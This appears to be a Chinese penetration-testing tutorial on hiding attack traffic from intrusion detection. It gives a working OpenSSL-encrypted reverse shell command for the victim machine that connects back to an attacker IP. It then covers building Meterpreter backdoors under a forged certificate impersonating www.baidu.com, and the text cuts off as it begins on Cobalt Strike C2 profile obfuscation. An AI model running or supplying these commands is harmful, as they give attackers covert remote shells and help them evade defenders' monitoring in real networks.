1.使用Openssl反弹加密shell

进行渗透测试 需要横向渗透 若反弹shell是明文传输，内网里面的IDS或防护软件会对流量进行分析，将检测到的具有攻击特征的流量进行回溯分析，攻击就会暴露 所以需要对流量进行加密

(不加密等于裸奔 应急溯源就进去了)

在无加密的情况下 我们抓取流量看看

攻击机kali2020.3  IP 192.168.1.101

受害机kali2019   IP 192.168.1.102

攻击机进行监听

受害机进行反弹

成功反弹shell到攻击机

在攻击机执行命令 利用受害主机的wireshark抓包

在受害主机上分析数据包

随便选一个 追踪tcp流

可以看到是明文传输的

现在使用Openssl对反弹shell进行加密

在攻击机kali2020.3上使用Openssl生成签名证书

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

可以填写证书信息 我这里没有填 一路回车 生成证书

https://docs.microsoft.com/zh-cn/azure/iot-hub/tutorial-x509-self-sign 这个是Openssl创建证书的文档

攻击机监听8080端口

openssl s_server -quiet -key key.pem -cert cert.pem -port 8080

在受害机kali2019上反弹shell命令

mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.1.101:8080 > /tmp/s; rm /tmp/s

查看攻击机成功反弹shell

在受害机用wireshark看看 找8080端口追踪tcp流

可以看到成功加密

2.MSF流量加密躲避检测

在内网渗透时，许多内网存在流量审计工具，分析流量计后门行为特征，使用metasploit进行内网渗透容易被检测出来，因此要进行流量加密 以此来逃离检测。

我使用了meterpreter_paranoid_mode.sh 和 Openssl生成后门

git clone https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL.git

Windows10受害者   192.168.1.100

Kali2020.3攻击机192.168.1.101

先使用Openssl生成证书openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \-subj "/C=UK/ST=London/L=London/O=Development/CN=www.baidu.com" \-keyout www.baidu.com.key \-out www.baidu.com.crt && \cat www.baidu.com.key www.baidu.com.crt > www.baidu.com.pem && \rm -f www.baidu.com.key www.baidu.com.crt

将上面生成的证书放到/Meterpreter_Paranoid_Mode-SSL/output下面

执行meterpreter_paranoid_mode.sh

回车选第一个

输入刚刚生成的证书域名(output文件夹里面)

我生成bat文件

之后的弹框 先是输入后门IP 然后就是端口 最后是payload

我选择攻击机IP

然后生成的后门在output文件夹下面

然后设置msf监听

3.CobaltStrike C2profile流量加密混淆

红队APT神器 现在很多ids检测工具 流量检测工具 都可以拦截发现 如果使用CS默认证书进行渗透，就会白给

生成证书修改C2 profile加密 逃逸流量安全审计

生成SSL证书

在CS默认使用的是cobaltstrike.store证书，默认证书会被检测。生成证书命令-----》
